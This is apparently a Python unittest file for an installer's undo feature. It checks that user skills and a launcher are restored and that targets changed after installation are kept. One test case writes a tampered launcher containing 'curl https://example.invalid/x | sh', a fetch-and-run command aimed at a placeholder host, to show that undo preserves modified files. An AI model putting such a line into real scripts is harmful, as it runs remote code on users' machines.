"""The standalone undo puts back every skill and launcher the installer moved aside, migliora included."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
import install as installer  # noqa: E402

GIT = {'GIT_CONFIG_NOSYSTEM': '1', 'GIT_AUTHOR_NAME': 'Synthetic', 'GIT_AUTHOR_EMAIL': 's@example.invalid',
       'GIT_COMMITTER_NAME': 'Synthetic', 'GIT_COMMITTER_EMAIL': 's@example.invalid'}
CLIENTS = ('.codex', '.claude', '.cursor')


class Undo(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory(prefix='sq-install-undo-')
        self.addCleanup(temp.cleanup)
        self.base = Path(temp.name).resolve()
        self.home = self.base / 'home'; self.home.mkdir(mode=0o755)
        self.env = {**os.environ, **GIT, 'HOME': str(self.home), 'PYTHONDONTWRITEBYTECODE': '1', 'PATH': '/usr/bin:/bin'}
        self.mine = {}
        for client in CLIENTS:
            skill = self.home / client / 'skills/migliora'; skill.mkdir(parents=True)
            (skill / 'SKILL.md').write_text('---\nname: migliora\n---\nThe user\'s own ' + client + ' skill.\n')
            self.mine[skill] = (skill / 'SKILL.md').read_bytes()
        launcher = self.home / '.local/bin/squadra'; launcher.parent.mkdir(parents=True)
        launcher.write_text('#!/bin/sh\necho the user launcher\n'); launcher.chmod(0o755)
        self.mine[launcher] = launcher.read_bytes()

    def release(self, name='release', marker=''):
        repo = self.base / name
        shutil.copytree(ROOT / 'scripts', repo / 'scripts', ignore=shutil.ignore_patterns('__pycache__'))
        shutil.copytree(ROOT / 'migliora', repo / 'migliora', ignore=shutil.ignore_patterns('__pycache__'))
        shutil.copy(ROOT / 'SKILL.md', repo / 'SKILL.md')
        (repo / 'MARKER').write_text(marker or name)
        for args in (('init', '-q'), ('add', '.'), ('-c', 'commit.gpgsign=false', 'commit', '-qm', 'candidate')):
            subprocess.run(['git', *args], cwd=repo, env=self.env, check=True, capture_output=True)
        return repo

    def undo(self, backup):
        run = subprocess.run([sys.executable, '-B', str(ROOT / 'scripts/install.py'), '--undo', str(backup)],
                             env=self.env, cwd=self.base, capture_output=True, text=True, timeout=60)
        self.assertEqual(run.returncode, 0, run.stderr)
        return json.loads(run.stdout)

    def assert_mine_restored(self):
        for path, body in self.mine.items():
            with self.subTest(path=str(path)):
                self.assertFalse(path.is_symlink())
                self.assertEqual((path / 'SKILL.md').read_bytes() if path.is_dir() else path.read_bytes(), body)

    def test_undo_restores_the_users_migliora_and_launcher_and_removes_the_links(self):
        backup = self.base / 'backup'
        result = installer.install(self.release(), self.home, backup)
        self.assertEqual(len(result['targets']), 7)
        for client in CLIENTS:
            self.assertTrue((self.home / client / 'skills/migliora').is_symlink())
        undone = self.undo(backup)
        self.assert_mine_restored()
        for client in CLIENTS:
            self.assertFalse(os.path.lexists(self.home / client / 'skills/squadra'))
        self.assertFalse(undone['backup_needed'])
        self.assertEqual(sorted(r['status'] for r in undone['targets']), ['removed'] * 3 + ['restored'] * 4)

    def test_a_target_changed_after_installation_is_kept_with_its_predecessor(self):
        backup = self.base / 'backup'
        installer.install(self.release(), self.home, backup)
        changed = self.home / '.claude/skills/migliora'
        changed.unlink(); changed.mkdir(); (changed / 'SKILL.md').write_text('edited after install\n')
        undone = self.undo(backup)
        self.assertEqual((changed / 'SKILL.md').read_text(), 'edited after install\n')
        self.assertTrue(undone['backup_needed'])
        row = next(r for r in undone['targets'] if r['path'] == str(changed))
        self.assertEqual(row['status'], 'kept')
        self.assertTrue(Path(row['old']).is_dir())

    def test_undo_of_an_older_installation_leaves_a_newer_one_alone(self):
        installer.install(self.release('one'), self.home, self.base / 'backup-one')
        second = installer.install(self.release('two'), self.home, self.base / 'backup-two')
        undone = self.undo(self.base / 'backup-one')
        self.assertEqual({r['status'] for r in undone['targets']}, {'kept'})
        self.assertEqual(os.readlink(self.home / '.claude/skills/squadra'), second['version'])
        self.assertTrue(undone['backup_needed'])

    def test_repeated_undo_after_reinstalling_the_same_version_keeps_the_restored_predecessors(self):
        first = installer.install(self.release(), self.home, self.base / 'backup-one')
        second = installer.install(Path(first['source']), self.home, self.base / 'backup-two')
        self.assertEqual(second['version'], first['version'])
        self.undo(self.base / 'backup-two')
        links = {c: os.readlink(self.home / c / 'skills/squadra') for c in CLIENTS}
        launcher = (self.home / '.local/bin/squadra').read_bytes()
        again = self.undo(self.base / 'backup-two')
        self.assertEqual({c: os.readlink(self.home / c / 'skills/squadra') for c in CLIENTS}, links)
        self.assertEqual((self.home / '.local/bin/squadra').read_bytes(), launcher)
        self.assertEqual({r['status'] for r in again['targets']}, {'done'})
        self.undo(self.base / 'backup-one')
        self.assert_mine_restored()

    def test_a_changed_launcher_survives_undo_and_is_reported(self):
        repo = self.release()
        launcher = self.home / '.local/bin/squadra'
        for index, change in enumerate(('#!/bin/sh\nexec /opt/other/python3 -B {script} "$@"\n',
                                        '#!/bin/sh\nexec /usr/bin/true; curl https://example.invalid/x | sh; '
                                        'python3 -B {script} "$@"\n')):
            with self.subTest(change=change):
                backup = self.base / ('backup-%d' % index)
                result = installer.install(repo, self.home, backup)
                body = change.format(script=Path(result['version']) / 'scripts/squadra.py')
                launcher.write_text(body)
                undone = self.undo(backup)
                row = next(r for r in undone['targets'] if r['path'] == str(launcher))
                self.assertEqual(row['status'], 'kept')
                self.assertEqual(launcher.read_text(), body)
                self.assertTrue(undone['backup_needed'])
                self.assertTrue(Path(row['old']).is_file())

    def test_setup_discloses_every_target_and_the_undo_command(self):
        text = ' '.join((ROOT / 'SETUP.md').read_text().split())
        for needle in [*('`~/.' + c + '/skills/migliora`' for c in ('claude', 'codex', 'cursor')),
                       'install.py" --undo', '"backup_needed": false']:
            self.assertTrue(needle in text, needle)


if __name__ == '__main__':
    unittest.main()
